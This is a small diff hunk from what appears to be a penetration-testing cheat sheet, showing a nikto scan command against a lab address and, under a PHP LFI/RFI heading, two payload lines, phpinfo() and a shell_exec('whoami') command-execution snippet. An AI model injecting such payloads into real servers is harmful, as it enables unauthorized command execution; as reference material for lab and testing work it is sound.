@@ -128,6 +128,7 @@ openvas-setup
 nikto -host 10.10.10.27 -port 80 -Display -o results.html -Format htm
 
 # ----- PHP LFI/RFI ----- #
+
 <?php phpinfo(); ?>
 
 <?php echo shell_exec('whoami'); ?>
